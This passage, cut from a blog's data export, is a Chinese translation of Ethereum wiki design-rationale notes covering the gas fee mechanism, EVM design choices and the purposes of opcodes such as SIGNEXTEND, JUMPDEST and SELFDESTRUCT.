字节的字大小，（iii）它使我们不会有非常复杂的可能导致安装困难的外部依赖性，以及（iv）针对以太坊的特殊安全需求的安全审查，无论如何都需要对外部虚拟机进行安全审查，因此节省的工作量并不大。\n* **使用可变的可扩展内存大小** - 我们认为，如果规模很小，或者规模很大，都没有必要限定一个固定的内存大小，并且注意如果内存访问的语句在任何情况下都需要检查越界访问，那么固定大小就不会使执行效率更高。\n* **不限制堆栈大小** - 没有任何特别的理由; 请注意，在许多情况下，限制并非绝对必要，因为燃料消耗和区块级燃料限制的组合总是作为每种资源消耗的上限。\n* **有一个 1024 层级深度的调用限制** - 许多编程语言在很高的堆栈深度时会比在很高的内存使用率或计算负载时突然崩溃的速度快得多，因此区块燃料限制的隐含限制可能不足。\n* **没有类型** - 为了简单。相反，取而代之的是使用有符号或无符号的操作码如 `DIV, SDIV, MOD, SMOD`（事实证明，对于 `ADD` 和 `MUL`，有符号和无符号操作码的行为是等同的），以及定点数运算（高深度定点运算是 32 字节字的另一个好处）在任何情况下都很简单，如 32 位深度，`a * b -> (a * b) / 2^32`，`a / b -> a * 2^32 / b` 以及 +，- 和 * 在整数情况下保持不变。\n\n虚拟机中的一些方法和操作码的目的是显而易见的，但也不全是。一些特殊解释给出如下：\n* **`ADDMOD, MULMOD`**：在大多数情况下，`addmod(a, b, c) = a * b % c`。然而，在许多类椭圆曲线密码学的特定情况下，使用 32 字节模块化算术，因此直接做 `a * b % c` 实际上是 `((a * b) % 2 ^ 256) % c`，这就是一个完全不同的结果。在 32 字节的空间中使用 32 字节的值计算 `a * b % c` 的公式是十分普通和臃肿的。\n* **SIGNEXTEND**：SIGNEXTEND 的目的是促进从更大的有符号整数到更小的有符号整数的类型转换。 小的带符号整数很有用，因为 JIT 编译的虚拟机将来可以检测长时间运行的代码块，这些代码块主要处理 32 字节整数，并大大加快速度。\n* **SHA3**： SHA3 在以太坊代码中十分使用，因为使用存储的安全无限大小散列映射可能需要使用安全散列函数，以防止恶意冲突，以及验证默克尔树，甚至是验证类以太坊的数据结构。一个关键点是它的朋友 SHA256，ECRECOVER 和 RIPEMD160不是作为操作码而是伪协议被包含其中。这样做的目的是将它们放入一个单独的类别中，以便在之后我们提出适当的“本机扩展”系统时，可以添加更多此类合约而不是填充操作码的空间。\n* **ORIGIN**：提供交易发送人的 `ORIGIN` 操作码的主要用途是允许合约对燃料进行退款支付。\n* **COINBASE**：`COINBASE` 操作码的主要用途是（i）允许子货币选择为网络安全做出贡献;以及（ii）开放矿工的使用权，作为分布式经济集合，用于基于次级共识的应用程序，如 Schellingcoin。\n* **PREVHASH**：用作半安全随机源，并允许合约评估前一个区块中 Merkle 树状态的树状证明，而不需要高度复杂的递归“以太坊中的以太坊轻客户端”构造。\n* **EXTCODESIZE, EXTCODECOPY**：这里的主要用途是允许合约在与其他合约进行交互之前，根据模板检查其他合约的代码，甚至模拟它们。见应用的[http://lesswrong.com/lw/aq9/decision_theories_a_less_wrong_primer/](http://lesswrong.com/lw/aq9/decision_theories_a_less_wrong_primer/)\n* **JUMPDEST**：JIT 编译的虚拟机在跳转目标受限于几个索引时变得更容易实现（具体的说，可变目标跳转的计算复杂度大致为 O(log(有效跳转目标的数量))，尽管静态跳转总是常量时间）。因此，我们需要（i）对有效变量跳转目标的限制，（ii）激励使用静态跳转。为了达到这些目的，我们有以下规则（i）在被推送紧接着的跳转可以跳转到任意地方，但是不能跳转到另一个跳转，（ii）其他跳转尽能跳到 JUMPDEST。限制跳转到跳转是必要的，这样查看一个跳转是动态还是静态的可以很容易的根据代码中在它之前的操作判断。对静态跳转缺乏 JUMPDEST 操作的需求是使用它们的动机。禁止跳入推送数据也会加速 JIT VM 的编译和执行。\n* **LOG**：LOG 表示记录事件，可见上面树的使用部分。\n* **CALLCODE**：这个操作符的目的是允许合约以存储在其他合约中的代码的形式调用“函数”，这样具有单独的堆栈和内存，但是使用该合约自己的存储。这使得在区块链上可扩展地实现代码的“标准库”变得更加容易。\n* **SELFDESTRUCT**：如果不再需要一个合约可以通过此操作符来销毁该合约。SELFDESTRUCT 在交易执行结束时被处理，而不是立即处理，这是因为拥有回滚早已执行的 SELFDESTRUCT 的能力会大大增加一个高效的虚拟机实现中所需的高速缓存的复杂度。\n* **PC**：尽管在理论上不是必需的，因为 PC 操作码的所有实例都可以通过简单地将实际的程序计数器放在该索引处作为推动来替换，使用代码中的 PC 允许创建与位置无关的代码（即编译的可复制/粘贴到其他合同中的函数，并且如果它们以不同的索引结束就不会中断）。\n","source":"_posts/以太坊wiki-设计原理翻译四.md","raw":"---\ntitle: 以太坊wiki-设计原理翻译四\ncomments: false\ndate: 2018-02-24 11:01:05\ncategories: 区块链\ntags: \n- ZhouFyk \n- 区块链 \n- 以太坊\nimg:\n---\n\n[以太坊wiki-设计原理翻译三](https://xingyunbite.github.io/2018/02/24/%E4%BB%A5%E5%A4%AA%E5%9D%8Awiki-%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86%E7%BF%BB%E8%AF%91%E4%B8%89/)\n\n## 燃料和手续费\n\n比特币中的交易大致相同，因此它们在网络上的成本可以抽象成一个模型，而以太坊中的交易则更复杂，交易费用系统需要考虑许多因素，包括带宽成本 ，存储成本和计算成本。特别重要的是，以太坊编程语言是图灵完备的，因此交易可以使用任意数量的带宽，存储和计算，并且因为不能提前可靠地预估暂停的问题，算力可能被大量使用。所以防止通过无限循环进行的拒绝服务攻击是一个关键目标。\n\n交易手续费的基本机制如下：\n* 每笔交易都需要指定一定数量愿意被花费的燃料（被称作 `startgas`），以及愿意为每单位燃料支付的价格（`gasprice`）。在执行之初，`startgas * gasprice` 这么多的 `ether` 会从交易发送者的账户中被扣除。\n* 交易执行期间的所有操作，包括数据库的读写，消息，和虚拟机中的每个计算步骤，都会消耗一定数量的燃料。\n* 如果一笔交易执行被完整地处理，消耗的燃料比它限定的燃料少，那么该剩余的燃料被称作 `gas_rem`。一笔交易首先会正常执行，然后在交易执行的最后，交易发送者会收到一笔退款 `gas_rem * gasprice`，矿工会收到一笔 `(startgas - gas_rem) * gasprice` 的奖励。\n* 如果在交易执行过程中，燃料耗尽，那么所有的执行都会被回滚，而交易也依旧未被验证。该交易的唯一影响是 `startgas * gasprice` 会被转给矿工。\n* 当一个合约发送一个消息给另一个合约，它也可以设置一个燃料限定值来指定由该消息引起的子执行操作。如果该执行耗尽燃料，那么一切回滚，而燃料也会被消耗。\n\n以上的每个部分都是必要的。例如：\n* 如果交易不需要指定燃料限制，那么恶意用户可以发送一笔进行数十亿循环的交易，因为处理这样的交易将花费比块间隔更长的时间，所以没有人能够处理它， 但矿工们无法预知该交易的存在，那么就会导致拒绝服务漏洞。\n* 将时间限制替代燃料限制，并不会起作用，因为这太主观了（有些机器比其他机器更快，甚至在相同的机器中也总是存在闭合调用）。\n* 整个值 `startgas * gasprice` 必须在开始时即作为押金取出，这样就不会出现账户在执行中“破产”并且无法支付燃料的情况。 请注意，余额检查是不够的，因为帐户可以在其他地方发送余额。\n* 如果在燃料不足的错误下，执行没有回滚，那么合约就需要采取强有力但是困难的安全措施，以防止自身被交易或消息利用而提供只能运行到一半的燃料，从而导致当前正在执行的合约发生一些变化。\n* 如果子限制不存在，那么敌对账户可以通过与其签订协议来制定对其他合同的拒绝服务攻击，然后在计算开始时插入无限循环，这样受害者合约中的任何企图补偿攻击合约（any attempts by the victim contract to compensate the attack contract）或向其发送消息的行为都会使整个交易执行陷于瘫痪。\n* 要求交易发送者支付燃料而不是合约来支付，大大提高了开发者的可用性。以太坊的早期版本有支付燃料的合约，但是这导致了一个相当丑的问题，即每个合约都必须实施“守卫”代码，以确保每一个传入的消息都足以补偿合约以足以支付燃料的消耗。\n\n注意燃料消耗的特定的特性：\n* 21000 单位的燃料是一笔交易的基本手续费。这涵盖了从签名中恢复发件人地址以及存储交易的空间和带宽空间的椭圆曲线操作的成本。\n* 一笔交易可以包括无限的数据，虚拟机提供了操作码使得合约接受交易来访问数据。固定燃料手续费为，每个 0 字节 4 单位燃料，每个非 0 字节 68 单位燃料。这个公式是因为我们注意到用户写的合约中的大多数交易数据都被组织成一系列 32 字节的参数，其中大部分都有前导 0 字节，虽然这样的构造看起来似乎没有效率，但是由于压缩算法的存在，这样反而十分有效率，我们希望鼓励使用它们来代替更复杂的机制，以便根据预期的字节数来压缩参数，从而在编译器级别增加复杂性。这是三明治复杂性模型的一个例外，但是由于成本与收益的比例，这是合理的。\n* `SSTORE` 操作符会在账户的存储空间中设置变量，它的消耗如下：(i) 将一个为零的变量改为非零时，为 20000 单位的燃料，(ii) 将一个零变量改为零变量，将一个非零变量改为非零变量时，为 5000 单位燃料，(iii) 将非零变量改为零变量时，为 5000 单位燃料，加上在成功交易执行结束时提供的 20000 单位燃料退款。（plus a 20000 gas refund to be given at the end of successful transaction execution）（即不是执行导致的燃料耗尽异常）。退款最高为交易花费的全部燃料的一半。这提供了一个小小的激励来清空存储空间，因为我们注意到，没有这样的激励的话，很多合约都会留下一些未使用的存储空间，导致快速膨胀增加体积，为存储“收取租金”提供了很多好处，同时也没有风险，一个被放置好的合同将永远存在。延迟退款机制对于防止拒绝服务攻击是必要的，攻击者会发送具有少量燃料的交易，在一个运行很长时间的循环中频繁清空大量的存储空间，这样会很快耗尽燃料，也会消耗验证者大量的算力，但这个操作实际上却并没有清空存储空间或者花费大量的燃料。50% 的上限是为了确保一个矿工在获得具有一定数量燃料的交易后仍然可以确定执行交易的计算时间的上限。\n* 合约提供的消息中的数据不会消耗燃料。这是因为在消息调用期间不需要真正“复制”任何数据，因为调用数据可以简单地看作是指向父合约的内存的指针，它在子进程执行期间不会改变。\n* 内存是一个无限可扩展的阵列。 但是，每 32 字节的内存扩展会消耗一个单位的燃料，这里会四舍五入。\n* 一些计算时间高度依赖于参数的操作码，拥有不同的燃料消耗值。比如，指数的燃料消耗为 10 加上指数中的每字节的 10 单位（即 x^0 = 1 燃料，x^1...x^255 = 2 燃料，x^256...x^65535 = 3 燃料 等等），而复制操作码（`CALLDATACOPY, CODECOPY, EXTCODECOPY`）的燃料消耗为 1 加上每 32 字节的一单位燃料，这里四舍五入（`LOG` 拥有类似的规则）。内存膨胀的燃料成本不足以弥补这一缺陷，因为它打开了一次二次攻击（50000 轮的 50000 单位燃料的 `CALLDATACOPY` 约为 50000 ^ 2 的计算量，但在引入可变燃料成本之前只有约 50000 单位燃料）\n* 如果值非零，那么`CALL` 操作码（和对称的 `CALLCODE`）花费额外的 9000 单位燃料。这是因为任意值转移都会导致存档节点的历史存储空间严重膨胀。注意，实际的手续费为 6700；在这之上我们强制增加了一个最低为 2300 单位的燃料用来自动给收据。这是为了确保收到交易的钱包至少有足额的燃料来记录该交易。\n\n燃料机制的另一个重要的部分是燃料价格本身的经济性。比特币中使用的默认方法是完全自愿的手续费，依靠矿工设置动态的最低值来扮演一个守门人的角色；与之相对的，在以太坊中，允许交易发送者设置任意的燃料消耗。这种方式在比特币社区中十分受欢迎，因为它是基于市场的，允许矿工和交易发送者之间的供需关系决定价格。然而这里存在一个问题，交易处理并不是市场；尽管将交易处理作为矿工提供给发送方的服务具有直接的吸引力，但实际上，矿工打包的每笔交易都需要被网络上的每个节点处理，因此绝大多数交易处理成本由第三方承担，而不是决定是否打包该交易的矿工。因此，很可能会发生普遍灾难（tragedy-of-the-commons）的问题。\n\n目前，由于缺少关于矿工实际上是如何处理的详细信息，我们实施了一个相当简单的方法：一个投票系统。矿工拥有权力对当前的区块设置燃料限制，该限制与上一个区块的燃料限制可以有大约 0.0975%（1/1024）的浮动，因此产生的燃料限制应该为矿工偏好的中位数。我们希望将来能够将其分解为更精确的算法。\n\n## 虚拟机\n\n以太坊虚拟机是交易码执行的引擎，也是以太坊和其他系统不同的核心特性。注意，将 *虚拟机* 和 *合约* 与 *消息模型* 分别看待，比如， `SIGNEXTEND` 操作码是虚拟机的一个特性，而合约可以调用其他合约，指定子调用的燃料限制是合约和消息的一部分。以太坊虚拟机的设计目的包括：\n\n* **简单**：尽可能少的底层操作码，尽可能少的数据类型，以及尽可能少的虚拟机层次的结构。\n* **完全明确**：在虚拟机的说明中绝对不允许存在模棱两可的情况，并且结果必须是完全确定的。另外，应该有一个精确的计算步骤的概念，可以测量计算燃料的消耗。\n* **节省空间**：以太坊虚拟机组件应尽可能紧凑（例如，默认 C 程序的 4000 字节基本大小是不可接受的）。\n* **期望的应用的专业能力（Specialization to expected applications）**：有能力处理 20 字节地址 和自定义的32 字节变量的加密，自定义加密中的模块化算法，读取区块和交易数据，与状态交互等等。\n* **简单的安全**：应该很容易就能够想出操作符的燃料消耗模型，该模型使得虚拟机无法被利用。\n* **优化友好**：应该很容易优化，以便可以构建 `JIT` 编译的和其他速度更快的 `VM` 版本。\n\n一些特殊的设计决定如下：\n* **临时/永久存储的区别** - 存在于虚拟机的每个实例内并在虚拟机执行完成时消失的临时存储与基于每个账户的存在于区块链状态级别上的永久存储之间存在区别。比如，假设执行下列执行树（使用 S 代表永久存储，M 代表临时存储）：（i） A 调用 B，（ii） B 设置 `B.S[0] = 5`，`B.M[0] = 9`，（iii） B 调用 C，（iv）C 调用 B。在此时，如果 B 树读取 `B.S[0]`，它会获取到之前存储在 B 中的值，但是 B 树读取 `B.M[0]`，它回返回 0，因为在虚拟机的临时存储中这个一个新的实例。如果 B 在这个内部调用中设置 `B.M[0] = 13` 和 `B.S[0] = 17`，然后这个内部调用和 C 的调用终止，使得执行回到 B 的外部调用，然后 B 读取 M，将会看到 `B.M[0] = 9`(自上次设置此值在同一个 VM 执行实例中) 和 `B.S[0] = 17`。如果 B 的外部调用终止，A 再次调用 B，然后 B 会看到 `B.M[0] = 0` 和 `B.S[0] = 17`。这种区别的目的是（1）为每个执行实例提供自己的内存，这些内存不会受到递归调用的破坏，使安全编程变得更加容易，并且（2）提供一种可以非常快地操作的内存形式， 因为需要修改树，所以存储更新的速度一定很慢。\n* **栈/内存模型** - 早期做出的决定有三种计算状态（除了指向下一条指令的程序计数器外）：栈（一种标准的先进后出的 32 字节变量栈），内存（一种无限可扩展的临时字节数组）和存储（永久存储）。在临时存储方面，堆栈和内存的替代方案是一个仅限内存的范例，或者是寄存器和内存的混合（不是很不相同，因为从根本上说寄存器也是一种内存）。在这个例子中，每个命令会有三个参数，如 `ADD R1 R2 R3:M[R1] = M[R2] + M[R3]`。选择堆栈范例的原因很明显，它使代码缩小了四倍。\n* **32 字节字大小** - 与其他大多数架构一样，替代方案是 4 或 8 个字节的字，或者像比特币一样是无限的字。4 字节或 8 字节字太严格，无法存储加密计算的地址和很大的值，而无限的值则很难根据其建立一个安全的燃料模型。32 字节是理想的，因为它足够大以存储许多加密实现中常见的 32 字节值，以及地址（并提供将地址和值打包到单个存储索引中的优化能力），但又不会太大以至于效率变得极低。\n* **拥有我们自己的虚拟机** - 替代方案是使用 `Java`，或者一些 `Lisp dialect`，或者 `Lua`。我们认为拥有一个专门的虚拟机是合适的，因为（i）我们的虚拟机规格比许多其他虚拟机简单得多，因为其他虚拟机必须为复杂性付出更低的成本，而在我们的情况下，每次增加复杂性都是朝着创建开发集中化和可能存在包括共识失败的安全漏洞这样的高门槛迈出的一步（whereas in our case every additional unit of complexity is a step toward high barriers of entry creating development centralization and potential for security flaws including consensus failures,），（ii）它使我们能够更专业化虚拟机，例如，通过具有 32 字节的字大小，（iii）它使我们不会有非常复杂的可能导致安装困难的外部依赖性，以及（iv）针对以太坊的特殊安全需求的安全审查，无论如何都需要对外部虚拟机进行安全审查，因此节省的工作量并不大。\n* **使用可变的可扩展内存大小** - 我们认为，如果规模很小，或者规模很大，都没有必要限定一个固定的内存大小，并且注意如果内存访问的语句在任何情况下都需要检查越界访问，那么固定大小就不会使执行效率更高。\n* **不限制堆栈大小** - 没有任何特别的理由; 请注意，在许多情况下，限制并非绝对必要，因为燃料消耗和区块级燃料限制的组合总是作为每种资源消耗的上限。\n* **有一个 1024 层级深度的调用限制** - 许多编程语言在很高的堆栈深度时会比在很高的内存使用率或计算负载时突然崩溃的速度快得多，因此区块燃料限制的隐含限制可能不足。\n* **没有类型** - 为了简单。相反，取而代之的是使用有符号或无符号的操作码如 `DIV, SDIV, MOD, SMOD`（事实证明，对于 `ADD` 和 `MUL`，有符号和无符号操作码的行为是等同的），以及定点数运算（高深度定点运算是 32 字节字的另一个好处）在任何情况下都很简单，如 32 位深度，`a * b -> (a * b) / 2^32`，`a / b -> a * 2^32 / b` 以及 +，- 和 * 在整数情况下保持不变。\n\n虚拟机中的一些方法和操作码的目的是显而易见的，但也不全是。一些特殊解释给出如下：\n* **`ADDMOD, MULMOD`**：在大多数情况下，`addmod(a, b, c) = a * b % c`。然而，在许多类椭圆曲线密码学的特定情况下，使用 32 字节模块化算术，因此直接做 `a * b % c` 实际上是 `((a * b) % 2 ^ 256) % c`，这就是一个完全不同的结果。在 32 字节的空间中使用 32 字节的值计算 `a * b % c` 的公式是十分普通和臃肿的。\n* **SIGNEXTEND**：SIGNEXTEND 的目的是促进从更大的有符号整数到更小的有符号整数的类型转换。 小的带符号整数很有用，因为 JIT 编译的虚拟机将来可以检测长时间运行的代码块，这些代码块主要处理 32 字节整数，并大大加快速度。\n* **SHA3**： SHA3 在以太坊代码中十分使用，因为使用存储的安全无限大小散列映射可能需要使用安全散列函数，以防止恶意冲突，以及验证默克尔树，甚至是验证类以太坊的数据结构。一个关键点是它的朋友 SHA256，ECRECOVER 和 RIPEMD160不是作为操作码而是伪协议被包含其中。这样做的目的是将它们放入一个单独的类别中，以便在之后我们提出适当的“本机扩展”系统时，可以添加更多此类合约而不是填充操作码的空间。\n* **ORIGIN**：提供交易发送人的 `ORIGIN` 操作码的主要用途是允许合约对燃料进行退款支付。\n* **COINBASE**：`COINBASE` 操作码的主要用途是（i）允许子货币选择为网络安全做出贡献;以及（ii）开放矿工的使用权，作为分布式经济集合，用于基于次级共识的应用程序，如 Schellingcoin。\n* **PREVHASH**：用作半安全随机源，并允许合约评估前一个区块中 Merkle 树状态的树状证明，而不需要高度复杂的递归“以太坊中的以太坊轻客户端”构造。\n* **EXTCODESIZE, EXTCODECOPY**：这里的主要用途是允许合约在与其他合约进行交互之前，根据模板检查其他合约的代码，甚至模拟它们。见应用的[http://lesswrong.com/lw/aq9/decision_theories_a_less_wrong_primer/](http://lesswrong.com/lw/aq9/decision_theories_a_less_wrong_primer/)\n* **JUMPDEST**：JIT 编译的虚拟机在跳转目标受限于几个索引时变得更容易实现（具体的说，可变目标跳转的计算复杂度大致为 O(log(有效跳转目标的数量))，尽管静态跳转总是常量时间）。因此，我们需要（i）对有效变量跳转目标的限制，（ii）激励使用静态跳转。为了达到这些目的，我们有以下规则（i）在被推送紧接着的跳转可以跳转到任意地方，但是不能跳转到另一个跳转，（ii）其他跳转尽能跳到 JUMPDEST。限制跳转到跳转是必要的，这样查看一个跳转是动态还是静态的可以很容易的根据代码中在它之前的操作判断。对静态跳转缺乏 JUMPDEST 操作的需求是使用它们的动机。禁止跳入推送数据也会加速 JIT VM 的编译和执行。\n* **LOG**：LOG 表示记录事件，可见上面树的使用部分。\n* **CALLCODE**：这个操作符的目的是允许合约以存储在其他合约中的代码的形式调用“函数”，这样具有单独的堆栈和内存，但是使用该合约自己的存储。这使得在区块链上可扩展地实现代码的“标准库”变得更加容易。\n* **SELFDESTRUCT**：如果不再需要一个合约可以通过此操作符来销毁该合约。SELFDESTRUCT 在交易执行结束时被处理，而不是立即处理，这是因为拥有回滚早已执行的 SELFDESTRUCT 的能力会大大增加一个高效的虚拟机实现中所需的高速缓存的复杂度。\n* **PC**：尽管在理论上不是必需的，因为 PC 操作码的所有实例都可以通过简单地将实际的程序计数器放在该索引处作为推动来替换，使用代码中的 PC 允许创建与位置无关的代码（即编译的可复制/粘贴到其他合同中的函数，并且如果它们以不同的索引结束就不会中断）。\n","slug":"以太坊wiki-设计原理翻译四","published":1,"updated":"2018-03-09T09:32:59.581Z","layout":"post","photos":[],"link":"","_id":"cjf7piavf000rpkwohf41z4og","content":"<p><a href=\"https://xingyunbite.github.io/2018/02/24/%E4%BB%A5%E5%A4%AA%E5%9D%8Awiki-%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86%E7%BF%BB%E8%AF%91%E4%B8%89/\" target=\"_blank\" rel=\"noopener\">以太坊wiki-设计原理翻译三</a></p>\n<h2 id=\"燃料和手续费\"><a href=\"#燃料和手续费\" class=\"headerlink\" title=\"燃料和手续费\"></a>燃料和手续费</h2><p>比特币中的交易大致相同，因此它们在网络上的成本可以抽象成一个模型，而以太坊中的交易则更复杂，交易费用系统需要考虑许多因素，包括带宽成本 ，存储成本和计算成本。特别重要的是，以太坊编程语言是图灵完备的，因此交易可以使用任意数量的带宽，存储和计算，并且因为不能提前可靠地预估暂停的问题，算力可能被大量使用。所以防止通过无限循环进行的拒绝服务攻击是一个关键目标。</p>\n<p>交易手续费的基本机制如下：</p>\n<ul>\n<li>每笔交易都需要指定一定数量愿意被花费的燃料（被称作 <code>startgas</code>），以及愿意为每单位燃料支付的价格（<code>gasprice</code>）。在执行之初，<code>startgas * gasprice</code> 这么多的 <code>ether</code> 会从交易发送者的账户中被扣除。</li>\n<li>交易执行期间的所有操作，包括数据库的读写，消息，和虚拟机中的每个计算步骤，都会消耗一定数量的燃料。</li>\n<li>如果一笔交易执行被完整地处理，消耗的燃料比它限定的燃料少，那么该剩余的燃料被称作 <code>gas_rem</code>。一笔交易首先会正常执行，然后在交易执行的最后，交易发送者会收到一笔退款 <code>gas_rem * gasprice</code>，矿工会收到一笔 <code>(startgas - gas_rem) * gasprice</code> 的奖励。</li>\n<li>如果在交易执行过程中，燃料耗尽，那么所有的执行都会被回滚，而交易也依旧未被验证。该交易的唯一影响是 <code>startgas * gasprice</code> 会被转给矿工。</li>\n<li>当一个合约发送一个消息给另一个合约，它也可以设置一个燃料限定值来指定由该消息引起的子执行操作。如果该执行耗尽燃料，那么一切回滚，而燃料也会被消耗。</li>\n</ul>\n<p>以上的每个部分都是必要的。例如：</p>\n<ul>\n<li>如果交易不需要指定燃料限制，那么恶意用户可以发送一笔进行数十亿循环的交易，因为处理这样的交易将花费比块间隔更长的时间，所以没有人能够处理它， 但矿工们无法预知该交易的存在，那么就会导致拒绝服务漏洞。</li>\n<li>将时间限制替代燃料限制，并不会起作用，因为这太主观了（有些机器比其他机器更快，甚至在相同的机器中也总是存在闭合调用）。</li>\n<li>整个值 <code>startgas * gasprice</code> 必须在开始时即作为押金取出，这样就不会出现账户在执行中“破产”并且无法支付燃料的情况。 请注意，余额检查是不够的，因为帐户可以在其他地方发送余额。</li>\n<li>如果在燃料不足的错误下，执行没有回滚，那么合约就需要采取强有力但是困难的安全措施，以防止自身被交易或消息利用而提供只能运行到一半的燃料，从而导致当前正在执行的合约发生一些变化。</li>\n<li>如果子限制不存在，那么敌对账户可以通过与其签订协议来制定对其他合同的拒绝服务攻击，然后在计算开始时插入无限循环，这样受害者合约中的任何企图补偿攻击合约（any attempts by the victim contract to compensate the attack contract）或向其发送消息的行为都会使整个交易执行陷于瘫痪。</li>\n<li>要求交易发送者支付燃料而不是合约来支付，大大提高了开发者的可用性。以太坊的早期版本有支付燃料的合约，但是这导致了一个相当丑的问题，即每个合约都必须实施“守卫”代码，以确保每一个传入的消息都足以补偿合约以足以支付燃料的消耗。</li>\n</ul>\n<p>注意燃料消耗的特定的特性：</p>\n<ul>\n<li>21000 单位的燃料是一笔交易的基本手续费。这涵盖了从签名中恢复发件人地址以及存储交易的空间和带宽空间的椭圆曲线操作的成本。</li>\n<li>一笔交易可以包括无限的数据，虚拟机提供了操作码使得合约接受交易来访问数据。固定燃料手续费为，每个 0 字节 4 单位燃料，每个非 0 字节 68 单位燃料。这个公式是因为我们注意到用户写的合约中的大多数交易数据都被组织成一系列 32 字节的参数，其中大部分都有前导 0 字节，虽然这样的构造看起来似乎没有效率，但是由于压缩算法的存在，这样反而十分有效率，我们希望鼓励使用它们来代替更复杂的机制，以便根据预期的字节数来压缩参数，从而在编译器级别增加复杂性。这是三明治复杂性模型的一个例外，但是由于成本与收益的比例，这是合理的。</li>\n<li><code>SSTORE</code> 操作符会在账户的存储空间中设置变量，它的消耗如下：(i) 将一个为零的变量改为非零时，为 20000 单位的燃料，(ii) 将一个零变量改为零变量，将一个非零变量改为非零变量时，为 5000 单位燃料，(iii) 将非零变量改为零变量时，为 5000 单位燃料，加上在成功交易执行结束时提供的 20000 单位燃料退款。（plus a 20000 gas refund to be given at the end of successful transaction execution）（即不是执行导致的燃料耗尽异常）。退款最高为交易花费的全部燃料的一半。这提供了一个小小的激励来清空存储空间，因为我们注意到，没有这样的激励的话，很多合约都会留下一些未使用的存储空间，导致快速膨胀增加体积，为存储“收取租金”提供了很多好处，同时也没有风险，一个被放置好的合同将永远存在。延迟退款机制对于防止拒绝服务攻击是必要的，攻击者会发送具有少量燃料的交易，在一个运行很长时间的循环中频繁清空大量的存储空间，这样会很快耗尽燃料，也会消耗验证者大量的算力，但这个操作实际上却并没有清空存储空间或者花费大量的燃料。50% 的上限是为了确保一个矿工在获得具有一定数量燃料的交易后仍然可以确定执行交易的计算时间的上限。</li>\n<li>合约提供的消息中的数据不会消耗燃料。这是因为在消息调用期间不需要真正“复制”任何数据，因为调用数据可以简单地看作是指向父合约的内存的指针，它在子进程执行期间不会改变。</li>\n<li>内存是一个无限可扩展的阵列。 但是，每 32 字节的内存扩展会消耗一个单位的燃料，这里会四舍五入。</li>\n<li>一些计算时间高度依赖于参数的操作码，拥有不同的燃料消耗值。比如，指数的燃料消耗为 10 加上指数中的每字节的 10 单位（即 x^0 = 1 燃料，x^1…x^255 = 2 燃料，x^256…x^65535 = 3 燃料 等等），而复制操作码（<code>CALLDATACOPY, CODECOPY, EXTCODECOPY</code>）的燃料消耗为 1 加上每 32 字节的一单位燃料，这里四舍五入（<code>LOG</code> 拥有类似的规则）。内存膨胀的燃料成本不足以弥补这一缺陷，因为它打开了一次二次攻击（50000 轮的 50000 单位燃料的 <code>CALLDATACOPY</code> 约为 50000 ^ 2 的计算量，但在引入可变燃料成本之前只有约 50000 单位燃料）</li>\n<li>如果值非零，那么<code>CALL</code> 操作码（和对称的 <code>CALLCODE</code>）花费额外的 9000 单位燃料。这是因为任意值转移都会导致存档节点的历史存储空间严重膨胀。注意，实际的手续费为 6700；在这之上我们强制增加了一个最低为 2300 单位的燃料用来自动给收据。这是为了确保收到交易的钱包至少有足额的燃料来记录该交易。</li>\n</ul>\n<p>燃料机制的另一个重要的部分是燃料价格本身的经济性。比特币中使用的默认方法是完全自愿的手续费，依靠矿工设置动态的最低值来扮演一个守门人的角色；与之相对的，在以太坊中，允许交易发送者设置任意的燃料消耗。这种方式在比特币社区中十分受欢迎，因为它是基于市场的，允许矿工和交易发送者之间的供需关系决定价格。然而这里存在一个问题，交易处理并不是市场；尽管将交易处理作为矿工提供给发送方的服务具有直接的吸引力，但实际上，矿工打包的每笔交易都需要被网络上的每个节点处理，因此绝大多数交易处理成本由第三方承担，而不是决定是否打包该交易的矿工。因此，很可能会发生普遍灾难（tragedy-of-the-commons）的问题。</p>\n<p>目前，由于缺少关于矿工实际上是如何处理的详细信息，我们实施了一个相当简单的方法：一个投票系统。矿工拥有权力对当前的区块设置燃料限制，该限制与上一个区块的燃料限制可以有大约 0.0975%（1/1024）的浮动，因此产生的燃料限制应该为矿工偏好的中位数。我们希望将来能够将其分解为更精确的算法。</p>\n<h2 id=\"虚拟机\"><a href=\"#虚拟机\" class=\"headerlink\" title=\"虚拟机\"></a>虚拟机</h2><p>以太坊虚拟机是交易码执行的引擎，也是以太坊和其他系统不同的核心特性。注意，将 <em>虚拟机</em> 和 <em>合约</em> 与 <em>消息模型</em> 分别看待，比如， <code>SIGNEXTEND</code> 操作码是虚拟机的一个特性，而合约可以调用其他合约，指定子调用的燃料限制是合约和消息的一部分。以太坊虚拟机的设计目的包括：</p>\n<ul>\n<li><strong>简单</strong>：尽可能少的底层操作码，尽可能少的数据类型，以及尽可能少的虚拟机层次的结构。</li>\n<li><strong>完全明确</strong>：在虚拟机的说明中绝对不允许存在模棱两可的情况，并且结果必须是完全确定的。另外，应该有一个精确的计算步骤的概念，可以测量计算燃料的消耗。</li>\n<li><strong>节省空间</strong>：以太坊虚拟机组件应尽可能紧凑（例如，默认 C 程序的 4000 字节基本大小是不可接受的）。</li>\n<li><strong>期望的应用的专业能力（Specialization to expected applications）</strong>：有能力处理 20 字节地址 和自定义的32 字节变量的加密，自定义加密中的模块化算法，读取区块和交易数据，与状态交互等等。</li>\n<li><strong>简单的安全</strong>：应该很容易就能够想出操作符的燃料消耗模型，该模型使得虚拟机无法被利用。</li>\n<li><strong>优化友好</strong>：应该很容易优化，以便可以构建 <code>JIT</code> 编译的和其他速度更快的 <code>VM</code> 版本。</li>\n</ul>\n<p>一些特殊的设计决定如下：</p>\n<ul>\n<li><strong>临时/永久存储的区别</strong> - 存在于虚拟机的每个实例内并在虚拟机执行完成时消失的临时存储与基于每个账户的存在于区块链状态级别上的永久存储之间存在区别。比如，假设执行下列执行树（使用 S 代表永久存储，M 代表临时存储）：（i） A 调用 B，（ii） B 设置 <code>B.S[0] = 5</code>，<code>B.M[0] = 9</code>，（iii） B 调用 C，（iv）C 调用 B。在此时，如果 B 树读取 <code>B.S[0]</code>，它会获取到之前存储在 B 中的值，但是 B 树读取 <code>B.M[0]</code>，它回返回 0，因为在虚拟机的临时存储中这个一个新的实例。如果 B 在这个内部调用中设置 <code>B.M[0] = 13</code> 和 <code>B.S[0] = 17</code>，然后这个内部调用和 C 的调用终止，使得执行回到 B 的外部调用，然后 B 读取 M，将会看到 <code>B.M[0] = 9</code>(自上次设置此值在同一个 VM 执行实例中) 和 <code>B.S[0] = 17</code>。如果 B 的外部调用终止，A 再次调用 B，然后 